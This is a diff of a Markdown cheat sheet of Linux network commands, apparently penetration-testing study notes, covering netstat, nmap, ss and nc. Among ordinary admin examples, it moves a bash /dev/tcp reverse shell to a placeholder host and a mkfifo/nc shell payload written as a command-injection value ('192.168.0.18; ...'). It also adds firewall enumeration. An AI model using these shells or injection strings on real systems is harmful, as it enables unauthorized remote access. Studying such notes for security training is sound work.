@@ -1,10 +1,40 @@
-# Network tool
+# Network command
+
+* Display the routing table
+```bash
+route
+```
 
 * Check network throughput on different interfaces
 ```bash
 cat /proc/net/dev
 ```
 
+* Interactive bash shell
+```bash
+/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
+```
+
+* Another way to get reverse shell with command execution
+```bash
+192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
+```
+
+* TCP scanning with `nc`. `-w` specifies timeout in seconds. 
+```bash
+nc -nvv -w 1 -z 127.0.0.1 1000-2000
+```
+* Transfer file with `nc`! `-n` for numeric only IP addresses.
+```bash
+# Receiver
+nc -nlvp 1337 > recv.txt
+
+# Sender
+nc 127.0.0.1 1337 < file.txt
+```
+
+
+# Network tool
 ## `netstat`
 
 * `-r` Show current system's routing table
@@ -39,33 +69,9 @@ sudo service networking restart
 sudo service network-manager restart
 ```
 
-# Network commands
 * nmap -A: Aggressive mode
 ```bash
 nmap -A IP
-```
-
-* Interactive bash shell
-```bash
-/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
-```
-
-* Another way to get reverse shell with command execution
-```bash
-192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
-```
-
-* TCP scanning with `nc`. `-w` specifies timeout in seconds. 
-```bash
-nc -nvv -w 1 -z 127.0.0.1 1000-2000
-```
-* Transfer file with `nc`! `-n` for numeric only IP addresses.
-```bash
-# Receiver
-nc -nlvp 1337 > recv.txt
-
-# Sender
-nc 127.0.0.1 1337 < file.txt
 ```
 
 * Scanning all services given a server with `nmap`
@@ -137,4 +143,13 @@ sudo ifconfig eth0 up
 
 * `ss`, socket statistic, `-a` shows all listening and non-listening sockets, `-n` displays the numeric IP, and does not resolve service name, `-t` specifies TCP sockets, `-l` displays only listening sockets, `-p` shows the process that is using the socket
 
+* Display active network connection with `netstat` or `ss`, `-a` lists all connection, `-n` display the numeric value of address and port, `-p` display the process that's using the connection
+```bash
+ss -anp
+```
 
+## Firewall Enumeration
+* To show firewall rules in Linux, we must have root privilege to use `iptables`. But, we might able to find some saved iptable rules in `/etc/*` using `grep`. `-H` shows the file name of a match, `-s` suppress error message
+```bash
+grep -Hs iptables /etc/*
+```
